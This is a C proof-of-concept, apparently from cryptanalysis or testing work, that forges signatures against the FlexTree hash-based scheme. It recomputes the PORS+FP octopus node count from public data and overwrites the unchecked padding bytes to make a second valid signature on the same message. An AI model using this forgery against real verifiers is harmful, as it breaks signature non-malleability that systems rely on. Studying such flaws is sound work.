/*
 * FlexTree strong forgery (sEUF-CMA) via unchecked PORS+FP auth-node padding.
 *
 * This translation unit #includes the vendor pors_fp.c UNMODIFIED so that the
 * attacker can call the (static) reference octopus routine; the vendor file on
 * disk is never edited, and pors_fp.c is therefore NOT linked separately.
 *
 * ATTACK PURITY: ft_public_auth_len() and ft_maul() take only public inputs
 * (public key, message, honest signature). No secret key is passed in.
 */
#include "pors_fp.c"          /* vendor file, unmodified */

#include <stdint.h>
#include <string.h>
#include "api.h"
#include "hash.h"
#include "thash.h"
#include "context.h"
#include "utils.h"

/* Layout of a FlexTree signature (spec eq. 4.1 / Fig. 1.15):
 *   R (n) | PORS+FP: ctr (4) | k secrets (k*n) | mMAX auth slots (mMAX*n) | hypertree ...
 * Slots m'..mMAX-1 are the zero padding (spec Sec. 1.10). */
#define FT_OFF_PORS   (SPX_N)
#define FT_OFF_AUTH   (SPX_N + COUNTER_SIZE + SPX_PORS_FP_K * SPX_N)

/* Number m' of octopus authentication nodes, recomputed from PUBLIC data only:
 * md <- H_msg(R, pk, M); I <- H_PORS(R, md, ctr); m' = |octopus(I)|.        */
int ft_public_auth_len(size_t *auth_len, const unsigned char *sig,
                       const unsigned char *m, unsigned long long mlen,
                       const unsigned char *pk)
{
    spx_ctx ctx;
    unsigned char mhash[SPX_PORS_FP_MSG_BYTES];
    uint64_t tree; uint32_t idx_leaf, ctr;
    uint32_t indices[SPX_PORS_FP_K];
    pors_node_pos nodes[PORS_AUTH_NODE_CAPACITY];

    memcpy(ctx.pub_seed, pk, SPX_N);              /* public seed */
    initialize_hash_function(&ctx);
    if (hash_message(mhash, &tree, &idx_leaf, sig, pk, m, mlen, &ctx) == -1) return -1;
    ctr = (uint32_t)bytes_to_ull(sig + FT_OFF_PORS, COUNTER_SIZE);
    if (pors_message_to_indices(indices, sig /* R */, mhash, ctr) != 0) return -1;
    pors_octopus_positions(nodes, auth_len, indices);
    return 0;
}

/* Write into sig_out (SPX_BYTES) a signature != sig_in on the SAME message by
 * overwriting every padding byte with attacker-chosen bytes. Returns the number of
 * padding bytes (0 = this signature has m' = mMAX, nothing to maul), <0 on error. */
long ft_maul(unsigned char *sig_out, const unsigned char *sig_in,
             const unsigned char *m, unsigned long long mlen,
             const unsigned char *pk, unsigned char fill)
{
    size_t used;
    if (ft_public_auth_len(&used, sig_in, m, mlen, pk) != 0) return -1;
    if (used > SPX_PORS_FP_MAX_AUTH_NODES) return -1;
    memcpy(sig_out, sig_in, SPX_BYTES);
    size_t lo = FT_OFF_AUTH + used * SPX_N, hi = FT_OFF_AUTH + SPX_PORS_FP_MAX_AUTH_NODES * SPX_N;
    for (size_t p = lo; p < hi; p++) sig_out[p] = (unsigned char)(fill ^ (p * 131u));
    return (long)(hi - lo);
}

/* exported for the driver's negative control */
size_t ft_off_auth(void) { return FT_OFF_AUTH; }
